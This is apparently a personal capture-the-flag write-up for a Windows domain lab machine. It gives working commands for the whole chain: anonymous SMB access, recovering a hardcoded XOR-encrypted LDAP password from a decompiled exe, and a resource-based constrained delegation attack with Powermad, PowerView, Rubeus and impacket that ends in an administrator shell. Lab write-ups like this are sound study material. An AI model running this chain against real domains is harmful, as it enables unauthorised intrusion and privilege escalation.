# User
After a quick nmap, we find smb open.
#smbclient #smbmap
```sh
smbclient -L //10.129.230.181/ -U Anonymous
smbmap -r -u Anonymous -p '' -H 10.129.230.181
```
So we connect
```
smbclient //10.129.230.181/support-tools/ -U Anonymous
```
When we unzip the UserInfo.exe file, we run strings on it, and find that there's some base64 encoded thing in there. Maybe #ghidra can help.
Looks interesting.
![[Pasted image 20240524134507.png]]
Maybe this is their password?
![[Pasted image 20240524134629.png]]
```
armando
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
```
but we also have:
```
support\ldap
```
So that string above is encrypted. Interesting.
Decoding the file with an online c# decompiler we get this:
```c#
static Protected()  
{  
Protected.enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";  
Protected.key = Encoding.ASCII.GetBytes("armando");  
}
public static string getPassword()  
{  
byte[] array = Convert.FromBase64String(Protected.enc_password);  
byte[] array2 = array;  
for (int i = 0; i < array.Length; i++)  
{  
array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);  
}  
return Encoding.Default.GetString(array2);  
}
```
Decrypting yields:

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
#ldapsearch time
```
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb'
```
This gives us another cred
```
Ironside47pleasure40Watchful
```
Let's try to login with #evil-winrm 
And we have User
# root
Let's use #powermad for some #constrained-delegation-exploit with some #powerview  to help
```powershell
Import-Module C:\Users\support\Documents\Powermad.ps1
new-machineaccount -MachineAccount deeznutz -Password $(convertto-securestring 'rhuge1!' -asplaintext -force) -verbose
upload PowerView.ps1
Import-Module C:\Users\support\Documents\PowerView.ps1
$ComputerSid = Get-DomainComputer deeznutz -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
```
Now we need to use #Rubeus and #impacket-getST-Ticketgrab
``` WEB
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe
```
```powershell
upload Rubeus.exe
C:\Users\support\Documents\Rubeus.exe hash /password:rhuge1! /user:deeznutz$ /domain:support.htb
```
```sh
impacket-getST support.htb/deeznutz -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 3A5EEC73AAEB8D7E24CC8E17ABA9B4709F7D7507B791ACFC3D59BED4654E1572
```
Finally we exploit with #impacket-smbexec
```
export KRB5CCNAME=administrator@http_dc.support.htb@SUPPORT.HTB.ccache
impacket-smbexec support.htb/administrator@dc.support.htb -no-pass -k
```